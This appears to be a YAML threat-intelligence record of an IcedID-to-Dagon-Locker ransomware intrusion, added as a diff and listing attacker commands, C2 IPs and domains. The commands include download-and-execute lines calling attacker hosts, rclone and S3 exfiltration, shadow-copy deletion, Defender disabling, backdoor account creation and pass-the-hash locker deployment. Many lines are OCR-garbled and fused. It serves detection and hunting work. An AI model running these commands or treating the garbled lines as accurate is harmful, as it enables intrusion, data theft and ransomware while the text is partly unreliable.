@@ -1,0 +1,394 @@
+description: A Black IcedID campaign targeting organizations with malicious JavaScript
+  delivered via email. The malware utilizes various techniques including process injection,
+  DLL host activity, and network communication to establish persistence and exfiltrate
+  data.
+date: '2024-04-29'
+authors:
+- r3nzsec
+- angelo_violetti
+- UC1
+- Unknown
+- ''
+- Tommy M (TheAnalyst)
+attribution:
+  threat_actor: IcedID botnet
+malware_families:
+- IcedID
+- Cobalt Strike
+- Dagon Locker
+- Egregor
+- REvil
+- Quantum
+- justright
+- Mount Locker
+- Pieper
+- uhmc/ummc
+- ottawa
+- Conti
+TTPs:
+  processs:
+  - cmd.exe
+  - powershell.exe
+  - rundll32.exe
+  - svchost.exe
+  - net.exe
+  - whoami.exe
+  - nltest.exe
+  - ping.exe
+  - Rclone
+  - Seatbelt
+  - SoftPerfect Netscan
+  - AnyDesk
+  - wmic.exe
+  - gpupdate.exe
+  - 7z.exe
+  - rclone.exe
+  - WaAppAgent.exe
+  - chrome.exe
+  - firefox.exe
+  - msedge.exe
+  - Riadncl.dll
+  - rundl132.exe
+  - reg.exe
+  - wmic
+  - vssadmin
+  - nltest
+  - ipconfig
+  - adfind.exe
+  - rclone
+  - awscli
+  - AnyDesk.exe
+  - bcedit
+  - 7za.exe
+  - mmc.exe
+  - awscli.exe
+  commandline:
+  - C:\Windows\System32\cmd.exe /c echo curl https://moashraya[.]com/out/t.php --output
+    "%temp%\magni.waut.a" --ssl no-revoke --insecure --location > "%temp%\magni.w.bat"
+  - cmd.exe /c "%temp%\magnu.w.bat"
+  - ren "%temp%\magni.waut.a" "magni.w"
+  - rundll32 "%temp%\magni.w", scab \k arabika752
+  - (New-Object System.Net.WebClient).DownloadFile("https://file[.]io/OUXPza4b4uxZ",
+    "C:\ProgramData\update.dll") %WINDIR%\system32\rundll32.exe" update.dll,HTVIyKUVoTzv
+  - invokemodule -module locker -locker <REDACTED>.dll -lockerpath programdata\microsoft
+    -lockertype dll -lockername sysfunc -lockerdeployonly $true -lockerentrypoint
+    run -handlesystems custom
+  - netsh portproxy add v4tov4 listenport=3390 sourceaddress=127.0.0.1 sourceport=3389
+    remoteaddress=192.168.1.10 remoteport=3389
+  - setspn -A svc_hostname <REDACTED>
+  - invokemodule -module locker -locker <REDACTED>.dll -lockerpath programdata\\microsoft
+    -lockertype dll -lockername sysfunc -lockerdeployonly $true -lockerentrypoint
+    run -handlesystems custom
+  - rundll32.exe C:\\programdata\\microsoft\\sysfunc.dll,run /target=C:\\programdata\\microsoft\\WPD\\
+  - Get-Service
+  - eventlogwecsvc
+  - SntpService
+  - "\"C:\\\\Windows\\\\system32\\\\cmd.exe\" /C rclone.exe copy \"\\\\\\\\FILE SERVER\\\
+    \\[REDACTED]\\\\\u201D 6666:[REDACTED]/[REDACTED]/ -q --ignore-existing --auto-confirm\
+    \ --multi-thread-streams 3 --transfers 3"
+  - '"C:\\programdata\\microsoft\\windows\\wer\\bin\\AWSCLIV2\\WaAppAgent.exe" s3
+    cp \\\\REDACTED\\G$\\Backupsold s3://REDACTED/REDACTED/G_Backupsold --region us-east-1
+    --recursive --endpoint-url https://REDACTED.s3-accelerate.amazonaws.com --exclude
+    *.mp4 --exclude *.jpg --exclude *.iso --exclude *.lnk --exclude *.url --exclude
+    *.dll --exclude *.exe --exclude *.chm --exclude *.swf --exclude *.mp3 --exclude
+    *.cab --exclude *.msi --exclude *.wav --exclude *.msi --exclude *.log --exclude
+    *.jpg --exclude *.msu --exclude *.m4a --exclude *.jar --exclude *.wma'
+  - get-eventlog security get-eventlog security >> ot.txt compress-archive -path ot.txt
+    -destinationpath ot.zip get-eventlog security | Out-String 4096 >> full_string.txt
+    get-eventlog security | Out-String 8192 >> 8.txt
+  - cmd.exe /c chcp >&2
+  - systeminfo
+  - ipconfig /all
+  - net config workstation
+  - nltest /domain_trusts
+  - cmd.exe /c start chrome.exe
+  - nltest /domain_trusts /all_trusts
+  - cmd.exe /c start firefox.exe
+  - net view /all /domain
+  - net group Domain Admins /domain
+  - cmd.exe /c start msedge.exe
+  - net view /all
+  - C:\\Windows\\systen32\\reg. exeoldadministrator /t REG_DNORD
+  - rundl132.exe C:\\ProgramData\\AnyDesk.exe install C:\\ProgramData\\AnyDesk start-with-win
+    --silent
+  - cmd.exe /c C:\\ProgramData\\AnyDesk.exe --get-id
+  - C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell. exe -executionpolicy
+    bypass -nop -hidden -enc
+  - C:\\Windows\\systen32\\gpupdate.exe
+  - C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe
+  - systeminfonet config workstation
+  - net group "Domain Admins" /domain
+  - net group \\"Domain Admins\\" /domain
+  - IcedID executed multiple discovery commands
+  - cmd.exe /C type found_shares.txt
+  - cmd.exe /C wmic /node:REDACTED process call create I\"rundll32.exe C:\\ProgramData\\update.dll
+    HTVIyKUVoTzvLSASS access on additional hosts frominjected gpupdate.exe
+  - Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\\ProgramData\\found_shares.txt
+  - cmd.exe /C whoami
+  - cmd.exe /C netscan.exe /hide /auto:"result.xml" /config:netscan.xml /range:[REDACTED]
+  - cmd.exe /C ipconfig
+  - cmd.exe /C netstat -an
+  - cmd.exe /C arp -an
+  - btscan.exe -v -s REDACTED/24
+  - cmd.exe /C net view REDACTED /ALL
+  - cmd.exe /C net config workstation
+  - cmd.exe /C nltest /domain_trusts
+  - adfind.exe -f (objectcategory=group) -csv name cn descriptionsAMAccountName >
+    adfind\\g.csv
+  - mmc.exe "C:\\Windows\\system32\\dssite.msc"
+  - mmc.exe "C:\\Windows\\system32\\domain.msc"
+  - mmc.exe "C:\\Windows\\system32\\dsa.msc"
+  - cmd.exe /C wmic /node:REDACTED process call create I\"rundll32.exe C:\\ProgramData\\update.dll
+    HTVIyKUVoTzv"
+  - netsh.exe interface portproxy show all
+  - netsh.exe interface portproxy addv4tov4 listenport=3390 listenaddress=[REDACTED]
+    connectport=3389connectaddress=[REDACTED]
+  - netsh.exe" advfirewall firewall add rulename=forwarded protocol=TCP dir=inlocalip=[REDACTED]
+    localport=3390action=allownetsh.exe interface portproxy deletev4tov4 listenport=3390
+    listenaddress=[REDACTED]
+  - cmd.exe /C net groups /domain
+  - net group "REDACTED" /domain
+  - cmd.exe /C net time /t
+  - InvokeModule -module locker -lockertype regsvr -locker32 stwain32.dll -locker64
+    stwain64.dll -lockerparams \\\"--detach -pc:\\\\windows\\\\temp\\\\tmpE42F3A55\\\"
+    -lockerfileless $false -execmethod smbexec domain CORP -user Administrator -passhashfae7df7a5c6ecf1679f476817d93e147
+    clearevents $true -stopav trend-micro,cylancedesktop handleSystems LVDCO1l -dryrun
+  - InvokeModule -module locker -handlesystems all -loglevel 5 -lockertype dll -locker32
+    file32.d1ll -locker64 file64.d11llockerfileless $false -lockerparams \\\"/MIN=128K
+    /MARKER=.rnd64\\\"
+  - InvokeModule -module locker -locker bin@4 -lockerpath Windows\\\\SysWOW64\\\\TimeControlSvc
+    -clearevents $false dryrun-loglevel 5 -execmethod smbexec -handleSystems OC-MELVERN
+    -domain fci -user Administrator passhashc12f230ab39ca651dd85464802d57b3d1448014481
+  - InvokeModule -module locker -locker bin@l1 -withdomain $true -dryrun $false -loglevel
+    5 -stopav carbonblackhandleSystems UHM-AWS-WEB@2 -execmethod smbexec -domain unmc.ad
+    -user admin passhash d55915158139997b91b75d369e51a8281448314484
+  - InvokeModule -module locker -locker bin64 -lockertype exe -lockerparams \\\"/FAST:@
+    /MARKER:.seed64\\\" -dryrun -loglevel 5stopav symantec -handleSystems ARLLA-PC714500145011450214503145041450514506145071450814509145101451114512145131451414515145161451714518145191452014521145221452314524145251452614527145281452914530145311453214533145341453514536
+  - InvokeModule -module awscollector awskey awssecretawss3bucket
+  - powershell invokemodule -module locker -lockertype exe locker encryptor.x64.bin
+    lockername r_server -lockerpathwindows\\\\system32 -dryrun -loglevel 5 -handleSystems
+    NCML-WEBGATE@1 -lockerfileless $false -lockerdeployonly $false
+  - powershell invokemodule -module locker -lockertype exe locker encryptor.x64.bin
+    lockername r_server -lockerpathwindows\\\\system32 -loglevel 5 -handleSystems
+    NCML-WEBGATE@1 -lockerfileless $false -lockerdeployonly $true
+  - InvokeModule -module lockerf-lockertype rundll -lockerdll gppupdate.dll -lockerparams
+    \\\"/marker:.pagefile.tmp\\\" -threads 40notaround $true -Llockerpath windows
+  - powerpick InvokeModule -module locker -lockertype rundll -lockerdll gppupdate.dll
+    -lockerparams \\\"/marker:.pagefile.tmp\\\"dryrun $false -nofaround $true loglevel
+    5 -handleSystems GMCFORAPPP@2V -domain GMC user MANNDC -passhashae04aeed6cb6cbe3380T2bacd166c9638
+  - powerpick InvokeModule -module locker -lockerdll gpupdate.dll -lockerpath windows\\\\installer
+    -lockerparams \\\"-pickthedick1@fast=8192\\\" -lockertype rundll -handleSystems
+    PHX-SRVCOFFICE -dryrun $false -loglevel 5 -nofaround $true
+  - powerpick InvokeModule -module locker -lockerdll gpupdate.dll lockerpath windows
+    -lockerparams \\\"-p5elonmusk2024 -fast=8192\\\"-lockertype rundll -handleSystems
+    PHX-SRVCOFFICE -dryrun $false -loglevel 5 nofaround $true
+  - powerpick InvokeModule -module locker -lockerdll gpupdate.dll -lockerpath windows
+    lockerparams \\\"-passegregor6\\\" -lockertyperundll -handleSystems 2UA5481PDG
+    -dryrun $false -loglevel 5 -nofaround $true
+  - powerpick InvokeModule -module locker -lockerdll gpupdate.dll -lockerpath windows
+    lockerparams \\\"-passegregor6\\\" -lockertyperundll -dryrun $false -loglevel
+    5 -nofaround $false -execmethod psexec threads 50
+  - get-eventlog security >> ot.txt
+  - compress-archive -path ot.txt -destinationpath ot.zip
+  - Set-MpPreference -DisableRealtimeMonitoring Strue
+  - cmd.exe\" /c C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win
+    --silent
+  - cmd.exe\" /c echo J9kzQ2Y0qO | \"C:\\ProgramData\\anydesk.exe\" --set-password
+  - net.exe user oldadministrator qc69t4B#Z0kE3 /add
+  - net.exe localgroup Administrators oldadministrator /ADD
+  - 7za.exe a -tzip -mx5 C:\\ProgramData\\REDACTED.zip IC:\\programdata\\REDACTED.pdf
+    -pTOPSECRETPASSWORD
+  - wmic shadowcopy /nointeractive
+  - wmic shadowcopy delete
+  - bcedit /set {default] bootstatuspolicy ignorereallifefailures
+  - bcedit /set {default] recoveryenabled no
+  - DEL "%~f0@"
+  - (New-ObjectSystem.Net.WebClient).DownloadFile(\"https://file[.]io/OUXPzadb4uxZ\",\"C:\\ProgramData\\update.dll\")
+  - '"C:\\Windows\\system32\\rundll32.exe" c:\\programdata\\update.dll,HTVIyKUVoTzv'
+  - adfind.exe -b dc=[REDACTED],dc=local -f "objectcategory=computer" >> computers.txt
+  - adfind.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName
+    > some.csv
+  - adfind.exe -f (objectcategory=person) -csv name cn title sAMAccountName > u.csv
+  - adfind.exe -f "(objectcategory=person)" > ad_users.txt
+  - R Data exfiltration through Rclone from the beachhead host and a domain controller
+  - Data exfiltration through the AWS CLI from a domain controller to S3 buckets
+  - wmic logicaldisk list brief
+  - wmic diskdrive list brief
+  - wmic memphysical list brief
+  - wmic memlogical list brief
+  - wmic memcache list brief
+  - wmic pagefile list brief
+  - wmic nic list brief
+  - wmic netprotocal list brief
+  - wmic bios list brief
+  - wmic csproduct
+  - netsh.exe\" advfirewall firewall add rulename=forwarded protocol=TCP dir=inlocalip=[REDACTED]
+    localport=3390action=allownetsh.exe interface portproxy deletev4tov4 listenport=3390
+    listenaddress=[REDACTED]
+  - invokemodule -module locker -locker[REDACTED].dIl -lockerpathprogramdata\\microsoft
+    -lockertype dll-lockername sysfunc -lockerdeployonly Sfalse -lockerentrypoint
+    run -lockerentrypointrun -lockerparams\"/target=C:\\programdata\\microsoft\\WPD\\\"
+    -handlesystems [REDACTED]
+  - invokemodule -module locker -locker[REDACTED].dIl -lockerpathprogramdata\\microsoft
+    -lockertype dll-lockername sysfunc -lockerdeployonly Sfalse -lockerentrypoint
+    run -handlesystemscustomare in 29 Days
+  - invokemodule -module locker -locker[REDACTED].dIl -lockerpathprogramdata\\microsoft
+    -lockertype dll-lockername sysfunc -lockerdeployonly Sfalse -lockerentrypoint
+    run -handlesystems [REDACTED]
+  powershell:
+  - powershell.exe(New-Object System.Net.WebClient).DownloadFile("https://file[.]io/OUXPza4b4uxZ",
+    "C:\ProgramData\update.dll") %WINDIR%\system32\rundll32.exe" update.dll,HTVIyKUVoTzv
+  - powershell script injecting a stageless beacon into memory (BASE64 encoded shellcode)
+  - anydesk.ps1 (script for installing AnyDesk and creating a new user account)
+  - invokemodule -module locker -locker <REDACTED>.dll -lockerpath programdata\\microsoft
+    -lockertype dll -lockername sysfunc -lockerdeployonly $true -lockerentrypoint
+    run -handlesystems custom
+  - invokemodule -module systeminfo -methods <METHOD> -handlesystems all
+  - InvokeModule -module awscollector -awskey REDACTED -awssecret REDACTED -awss3bucket
+    REDACTED_DOMAIN -awsregion us-east-1 -handleSystems REDACTED_TARGETHOST
+  - IEX ((new-object net.webclient).downloadstring(\"http://51.89.133.3:80/ws01cs10/https64\"))
+  - "function Send-TelegramTextMessage2 {[CndLetBinding()]Paran([Paraneter(Mandatory\
+    \ = $true, Position = 0, ValueFromPipeline = $true)] [stringl$nsg)Invoke-WebRequest\
+    \ -Uri \\\\\\\"http://winupdate.us.to/tg?n=gnsg\\\\\\\" -UseBasicParsing | Out-Nullv\
+    \ 2c1690cefdBbec76a7cIdAC7609253583aa48 102Serial NumberIssuedExpiresCommon NameAtemative\
+    \ NamesOrganization NameSsLversionOrganization UnitStreat AddressLocaiiyState/ProvinceCountry4076277665767487538600581157180112357833672021102520220123R3\
+    \ (issuer)fes2msftcom (subject)fes2msftcom (subject)Let\u2019s Encrypt (isuer)3US\
+    \ fissuen)"
+  - Set-MpPreference -DisableRealtimeMonitoring Strue
+  - Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\\ProgramData\\found_shares.txt
+  - (New-ObjectSystem.Net.WebClient).DownloadFile(\"https://file[.]io/OUXPzadb4uxZ\",\"C:\\ProgramData\\update.dll\")
+  scripting_engine: {}
+  registry_keys: {}
+  network_connections:
+  - process: IcedID
+    port: '443'
+    destination:
+    - ewacootili[.]com (151.236.9[.]176)
+    - ultrascihictur[.]com (159.223.95[.]82)
+    - magiraptoy[.]com (194.58.68[.]187)
+    - moashraya[.]com
+  - process: Cobalt Strike
+    port: '443'
+    destination:
+    - 23.159.160[.]88
+    - 45.15.161[.]97
+    - 51.89.133[.]3
+    - winupdate.us[.]to
+  - port: 443
+    destination:
+    - 143.110.245[.]38
+    - 159.89.124[.]188
+    - 188.114.97[.]7
+    - 151.236.9[.]176
+    - 159.223.95[.]82
+    - 194.58.68[.]187
+    - 87.251.67[.]168
+    - 151.236.9[.]166
+  - port: 443
+    destination:
+    - rpgmagglader[.]com
+    - ultrascihictur[.]com
+    - oopscokir[.]com
+    - restohalto[.]site
+    - ewacootili[.]com
+    - magiraptoy[.]com
+    - fraktomaam[.]com
+    - patricammote[.]com
+    - moashraya[.]com
+  - port: 443
+    destination:
+    - 23.159.160[.]88
+    - 45.15.161[.]97
+    - 51.89.133[.]3
+    - winupdate.us[.]to
+  - 23.159.160.88
+  - 45.15.161.97
+  - 51.89.133.3
+  - 108.62.123.147
+  - port: 443
+    destination:
+    - 145.110.245[.]38
+    - 159.89.124[.]188
+    - 188.114.97[.]7
+    - 151.236.9[.]176
+    - 159.223.95[.]82
+    - 194.58.68[.]187
+    - 87.251.67[.]168
+    - 151.236.9[.]166
+  - destination:
+    - rpgmagglader[.]com
+    - ultrascihictur[.]com
+    - oopscokir[.]com
+    - restohalto[.]site
+    - ewacootili[.]com
+    - magiraptoy[.]com
+    - fraktomaam[.]com
+    - patricammote[.]com
+    - moashraya[.]com
+  - destination:
+    - 23.159.160[.]88
+    - 45.15.161[.]97
+    - 51.89.133[.]3
+    - winupdate.us[.]to
+  - port: 80
+    destination: 51.89.133.3
+  - process: IcedID
+    port: 443
+    destination:
+    - 188.114.97.7
+    - 151.236.9.176
+    - 159.223.95.82
+    - 194.58.68.187
+    - 176.124.32.164
+  - port: 3390
+  - port: 3389
+  file_modifications:
+  - C:\Windows\System32\cmd.exe
+  - C:\ProgramData\update.dll
+  - C:\Users/<user>\AppData\Roaming\AnyDesk\ad.trace
+  - C:\ProgramData\Anydesk\ad_svc.trace
+  - C:\Windows\System32\GroupPolicy\User\Scripts\Logon\test.bat
+  - sysfunc.cmd (dropped on systems)
+  - sysfunc.dll.log
+  - C:\\programdata\\microsoft\\sysfunc.dll
+  - C:\\programdata\\microsoft\\WPD\\ <REDACTED>.dll
+  - sysfunc.cmd
+  - C:\\Windows\\system32\\cmd.exe
+  - C:\\programdata\\microsoft\\windows\\wer\\bin\\AWSCLIV2\\WaAppAgent.exe
+  - C:\\ProgramData\\AnyDesk.exe
+  - C:\\ProgramData\\AnyDesk\\AnyDesk.exe
+  - C:\\Windows\\Systen32\\Tasks\\{C2696864-4C7C-9897-814A-BEEF61F7BEA2}
+  - C:\\Windows\\System32\\GroupPolicy\\User\\Scripts\\Logon\\test.bat
+  - C:\\ProgramData\\update.dll
+  - C:\\ProgramData\\REDACTED.zip
+  - C:\\ProgramData\\REDACTED.pdf
+  persistence: {}
+  pipes:
+  - ''
+  process_relations: {}
+IOCs:
+  hashes: []
+  ips:
+  - 188.114.97.7
+  - 151.236.9.176
+  - 159.223.95.82
+  - 194.58.68.187
+  - 176.124.32.164
+  - 151.236.9.166
+  - 87.251.67.168
+  - 23.159.160.88
+  - 45.15.161.97
+  - 184.168.117.217
+  domains:
+  - oopscokir.com
+  - ewacootili.com
+  - ultrascihictur.com
+  - magiraptoy.com
+  - rpgmagglader.com
+  - patricammote.com
+  - moashraya.com
+  - winupdate.us.to
+  urls:
+  - https://file[.]io/OUXPzadb4uxZ
+reference: https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/
+file_creation_date: May 12, 2025
